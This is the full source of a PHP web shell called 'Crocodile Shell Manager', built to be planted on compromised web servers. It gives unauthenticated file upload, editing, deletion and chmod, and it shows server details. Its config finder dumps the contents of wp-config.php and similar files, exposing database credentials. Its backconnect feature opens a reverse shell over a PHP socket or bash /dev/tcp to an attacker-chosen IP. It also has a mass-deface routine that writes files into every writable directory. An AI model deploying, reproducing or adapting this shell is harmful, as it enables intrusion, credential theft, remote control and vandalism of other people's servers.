<?php
error_reporting(0);
set_time_limit(0);

function getPermColor($path) {
    $perms = substr(sprintf('%o', fileperms($path)), -4);
    $owner = fileowner($path);
    $isMine = $owner === fileowner(__FILE__);

    if ($perms === "000" || !$isMine) return 'red';
    if ($perms === "444" || $perms === "555") return 'white';
    return 'lime';
}

function formatPathBreadcrumb($path) {
    $parts = explode("/", $path);
    $build = "";
    $out = "<a href='?path=/'>/</a>";
    foreach ($parts as $part) {
        if ($part == "") continue;
        $build .= "/$part";
        $out .= "<a href='?path=" . urlencode($build) . "'>/$part</a>";
    }
    return $out;
}

function infoServer() {
    echo "<h2>🌐 Server Info</h2><ul>";
    echo "<li><b>Hostname:</b> " . gethostname() . "</li>";
    echo "<li><b>Server IP:</b> " . $_SERVER['SERVER_ADDR'] . "</li>";
    echo "<li><b>Client IP:</b> " . $_SERVER['REMOTE_ADDR'] . "</li>";
    echo "<li><b>User:</b> " . get_current_user() . "</li>";
    echo "<li><b>OS:</b> " . php_uname() . "</li>";
    echo "<li><b>PHP Version:</b> " . phpversion() . "</li>";
    echo "</ul><hr>";
}

function countFilesAndFolders($dir) {
    $files = 0;
    $folders = 0;
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir("$dir/$item")) $folders++;
        else $files++;
    }
    return [$folders, $files];
}

function listDirectory($path) {
    echo "<h3>📁 Path: " . formatPathBreadcrumb($path) . "</h3>";
    echo "<form method='post' enctype='multipart/form-data'>
        <input type='file' name='upload'>
        <input type='submit' name='doUpload' value='Upload'>
    </form>
    <form method='post'>
        <input type='submit' name='findConfig' value='🔍 Cari Config'>
        <input type='submit' name='showBackconnect' value='📡 Backconnect'>
        <input type='submit' name='showDeface' value='💣 Mass Deface'>
    </form><br>";

    list($folders, $files) = countFilesAndFolders($path);
    echo "<b>🗂️ Folders:</b> $folders | <b>📄 Files:</b> $files<br><br>";

    echo "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";

    foreach (scandir($path) as $item) {
        if ($item == '.') continue;
        $full = "$path/$item";
        $type = is_dir($full) ? '📁 Folder' : '📄 File';
        $size = is_file($full) ? filesize($full) : '-';
        $permColor = getPermColor($full);
        $permVal = substr(sprintf('%o', fileperms($full)), -4);
        $encoded = urlencode($item);

        echo "<tr>
        <td><a href='?path=" . urlencode(realpath($full)) . "'>$item</a></td>
        <td>$type</td>
        <td>$size</td>
        <td style='color:$permColor'>$permVal</td>
        <td>";
        if (is_file($full)) echo "<a href='?path=$path&edit=$encoded'>Edit</a> | ";
        echo "<a href='?path=$path&delete=$encoded' onclick='return confirm(\"Delete $item?\")'>Delete</a> | ";
        echo "<a href='?path=$path&chmod=$encoded'>CHMOD</a> | ";
        echo "<a href='?path=$path&rename=$encoded'>Rename</a>";
        echo "</td></tr>";
    }
    echo "</table>";
}

function editFile($file) {
    if (isset($_POST['save'])) file_put_contents($file, $_POST['content']);
    $content = htmlspecialchars(file_get_contents($file));
    echo "<h3>✏️ Editing: $file</h3>
    <form method='post'>
    <textarea name='content' rows='20' cols='100'>$content</textarea><br>
    <input type='submit' name='save' value='Save File'>
    </form>";
}

function deleteFile($path) {
    if (is_dir($path)) rmdir($path);
    else unlink($path);
}

function renameFile($old) {
    if (isset($_POST['newname'])) {
        $new = dirname($old) . '/' . $_POST['newname'];
        rename($old, $new);
    }
    echo "<form method='post'>Rename '$old' to: <input name='newname'><input type='submit' value='Rename'></form>";
}

function chmodFile($file) {
    if (isset($_POST['perm'])) chmod($file, octdec($_POST['perm']));
    echo "<form method='post'>CHMOD $file: <input name='perm'><input type='submit' value='Change'></form>";
}

function findConfigs($dir) {
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    echo "<h3>🔐 Found Config Files</h3><ul>";
    foreach ($files as $file) {
        if (preg_match('/wp-config\\.php|configuration\\.php|config\\.php/i', $file)) {
            echo "<li><b>" . $file . "</b><pre>" . htmlspecialchars(file_get_contents($file)) . "</pre></li>";
        }
    }
    echo "</ul><hr>";
}

function showBackconnect() {
    echo "<h3>📡 Reverse Shell</h3>
    <form method='post'>
    IP: <input name='ip'> Port: <input name='port'>
    <select name='method'>
        <option value='php'>PHP Socket</option>
        <option value='nc'>Netcat</option>
    </select>
    <input type='submit' name='runBackconnect' value='Connect'>
    </form>";
}

function doBackconnect($ip, $port, $method) {
    if ($method == 'php') {
        $sock = fsockopen($ip, $port);
        if ($sock) {
            fwrite($sock, "Connected to shell\\n");
            while (!feof($sock)) {
                $cmd = fgets($sock, 4096);
                fwrite($sock, shell_exec($cmd) . "\\n");
            }
            fclose($sock);
        }
    } else {
        system("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
    }
}

function showMassDeface() {
    echo "<h3>💣 Mass Deface</h3>
    <form method='post'>
    Filename: <input name='deface_file'>
    <br>Content:<br>
    <textarea name='deface_content' rows='10' cols='60'></textarea><br>
    <input type='submit' name='runDeface' value='Deface All Folders'>
    </form>";
}

function runMassDeface($dir, $filename, $content) {
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = "$dir/$item";
        if (is_dir($full) && is_writable($full)) {
            file_put_contents("$full/$filename", $content);
        }
    }
    echo "<div class='msg'>✅ Defaced folders with $filename</div>";
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !file_exists($path)) $path = getcwd();

echo "<!DOCTYPE html><html><head><title>Crocodile Shell Manager</title>
<style>
body {
    background: url('https://www.msbte.in.net/wp-content/themes/pridmag/foto.jpg') no-repeat center center fixed;
    background-size: cover;
    color: #fff;
    font-family: monospace;
    padding: 20px;
    backdrop-filter: blur(3px);
}
table {
    width: 100%;
    background-color: rgba(0,0,0,0.6);
    border-collapse: collapse;
}
th, td {
    padding: 8px;
    border: 1px solid #444;
}
input, textarea {
    background: #222;
    color: #0f0;
    border: 1px solid #555;
    padding: 4px;
    font-family: monospace;
}
form { margin-bottom: 15px; }
h2, h3 {
    background-color: rgba(0,0,0,0.7);
    padding: 10px;
}
a { color: #0af; text-decoration: none; }
a:hover { text-decoration: underline; }
.msg { color: #0f0; }
.err { color: #f00; }
</style>
</head><body>";

infoServer();

if (isset($_POST['doUpload']) && isset($_FILES['upload']))
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . basename($_FILES['upload']['name']));

if (isset($_POST['findConfig'])) findConfigs($path);
elseif (isset($_POST['showBackconnect'])) showBackconnect();
elseif (isset($_POST['runBackconnect'])) doBackconnect($_POST['ip'], $_POST['port'], $_POST['method']);
elseif (isset($_POST['showDeface'])) showMassDeface();
elseif (isset($_POST['runDeface'])) runMassDeface($path, $_POST['deface_file'], $_POST['deface_content']);
elseif (isset($_GET['edit'])) editFile($path . '/' . $_GET['edit']);
elseif (isset($_GET['delete'])) deleteFile($path . '/' . $_GET['delete']);
elseif (isset($_GET['rename'])) renameFile($path . '/' . $_GET['rename']);
elseif (isset($_GET['chmod'])) chmodFile($path . '/' . $_GET['chmod']);
else listDirectory($path);

echo "</body></html>";
?>